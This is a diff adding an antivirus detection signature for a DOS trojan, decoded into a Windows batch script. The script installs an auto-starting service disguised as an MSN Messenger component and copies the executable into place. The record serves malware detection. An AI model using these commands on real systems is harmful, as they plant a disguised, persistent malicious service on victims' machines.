@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36557
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off @sc stop usnjsvc @sc delete usnjsvc @sc create usnjsvc binpath= "c:\program files\msn messenger\usnsvc.exe" displayname= "messenger usn " depend= rpcss start= auto @sc description usnjsvc "messenger " @copy usnsvc.exe "c:\program files\msn messenger\usnsvc.exe" @sc start usnjsvc 
